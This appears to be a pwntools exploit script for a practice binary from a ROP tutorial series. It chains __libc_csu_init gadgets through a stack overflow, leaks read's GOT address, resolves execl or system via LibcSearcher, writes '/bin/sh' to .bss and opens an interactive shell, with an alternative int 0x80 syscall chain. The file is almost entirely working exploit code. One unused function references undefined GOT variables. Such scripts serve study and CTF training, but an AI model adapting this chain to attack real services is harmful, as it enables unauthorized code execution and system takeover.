#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. csu_init could ONLY set edi, so the first argument should be ONLY 32bit
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug')

p = process('ROP_STEP_BY_STEP-master/linux_x64/level5.compile')
#p = remote('127.0.0.1',10001)

elf = ELF('ROP_STEP_BY_STEP-master/linux_x64/level5.compile')

read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
write_plt = elf.symbols['write']
print 'write_plt= ' + hex(write_plt)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
write_got = elf.got['write']
print 'write_got= ' + hex(write_got)
start_addr = elf.start # it would fail if using elf.symbols['main']
print 'start_addr= ' + hex(start_addr)
vulfun_addr = elf.symbols['vulnerable_function']
print 'vulfun_addr= ' + hex(vulfun_addr)
bss_addr = elf.bss()
print "bss_addr=" + hex(bss_addr)

offset = 136 #return by pattern.py
junk = 0

#pop junk, rbx, rbp, r12, r13, r14, r15
pop_junk_rbx_rbp_r12_r13_r14_r15 = 0x4005d6 #0x400606
# Notice rdx and rdi sequence!!!!
#mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
#mov_mov_mov_call = 0x4005F0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdi, r14=rsi, r15=rdx
#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
mov_mov_mov_call = 0x4005c0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdx, r14=rsi, r15=rdi
def callByCsuInit(fun_addr_relative, *args):
  length = len(args)
  payload = "a" * offset + p64(pop_junk_rbx_rbp_r12_r13_r14_r15) \
            + p64(junk) + p64(0) + p64(1) + p64(fun_addr_relative) \
            + p64(length >=3 and args[2] or junk) + p64(length >=2 and args[1] or junk) + p64(args[0]) \
            + p64(mov_mov_mov_call) + "a" * 8 * 7 + p64(start_addr)
  p.recvuntil("Hello, World\n")
  p.send(payload)


# 1. leak read_got by write_got
callByCsuInit(write_got, 1, read_got, 8)
read_addr = u64(p.recv(8))
print 'read_addr= ' + hex(read_addr)

#Given libc
def getAddrByLibc(symbol):
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  symbol_addr = read_addr + (libc.symbols[symbol] - libc.symbols['read'])
  print 'symbol_addr= ' + hex(symbol_addr)
  return symbol_addr

#search libc in libc-db by LibcSearcher
def getAddrBySearcher(symbol):
  libc = LibcSearcher('read', read_addr)
#  libc.add_condition(leaked_func, leaked_address)
  symbol_addr = read_addr + (libc.dump(symbol) - libc.dump('read'))
  print 'symbol_addr= ' + hex(symbol_addr)
  return symbol_addr


def writeBss(symbol):
#  symbol_addr = getAddrByLibc(symbol)
  symbol_addr = getAddrBySearcher(symbol)

  callByCsuInit(read_got, 0, bss_addr, 16)
  sleep(1)  # would fail if not sleep!!! since send data would mess up
  p.send(p64(symbol_addr))
  p.send("/bin/sh\0") #it could be just "sh" for system, "/bin/sh" for execl
  print "finish writing to bss"

def pwnLibcall():
  # 2. write system_addr/execl_add and /bin/sh to bss
  #writeBss('system')
  writeBss('execl')  # execl could not return to start_addr

  # 3. call execl('/bin/sh', null, null)
  callByCsuInit(bss_addr, bss_addr + 8, 0, 0)

#/usr/include/asm/unistd_32.h: #define __NR_execve 11
# execve("/bin/sh",NULL,NULL)
# mov eax,0xb; mov ebx, /bin/sh; mov ecx, 0; mov edx, 0; int 0x80
def pwnSyscall():
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  # 0x0000000000035fc8 : pop rax ; ret
  pop_rax_ret_libc = 0x0000000000035fc8
  pop_rax_ret = read_addr + (pop_rax_ret_libc - libc.symbols['read'])
  print 'pop_rax_ret= ' + hex(pop_rax_ret)
  # 0x00000000000d1ad9 : pop rdx ; pop rcx ; pop rbx ; ret
  pop_rdx_rcx_rbx_ret_libc = 0x00000000000d1ad9
  pop_rdx_rcx_rbx_ret = read_addr + (pop_rdx_rcx_rbx_ret_libc - libc.symbols['read'])
  print 'pop_rdx_rcx_rbx_ret= ' + hex(pop_rdx_rcx_rbx_ret)
  # 0x0000000000002c3b : int 0x80
  int_80_libc = 0x0000000000002c3b
  int_80 = read_addr + (int_80_libc - libc.symbols['read'])
  print 'int_80= ' + hex(int_80)

  # int 0x80 ONLY works for 32 bit syscall, so /bin/sh address could ONLY be 32bit!
  callByCsuInit(read_got, 0, bss_addr, 8)
  sleep(1)  # would fail if not sleep!!! since send data would mess up
  p.send("/bin/sh\0")

  payload = "a" * offset + p64(pop_rax_ret) + p64(0xb) + p64(pop_rdx_rcx_rbx_ret) + p64(0) + p64(0) + p64(
    bss_addr) + p64(int_80)
  p.recvuntil("Hello, World\n")
  p.send(payload)

pwnLibcall()

def pwnInOne():
  payload = 'a'*offset + p64(pop_junk_rbx_rbp_r12_r13_r14_r15)
  payload += p64(junk) + p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(puts_got) + p64(1) #write(1, puts_got, 8)
  payload += p64(mov_mov_mov_call) + 'a'*8
  payload += p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0) #read(0, atoi_got, 8)
  payload += p64(mov_mov_mov_call) + 'a'*8*7 + p64(start_addr)
  p.sendline(payload)
#pwnInOne()
#pwnSyscall()
p.interactive()
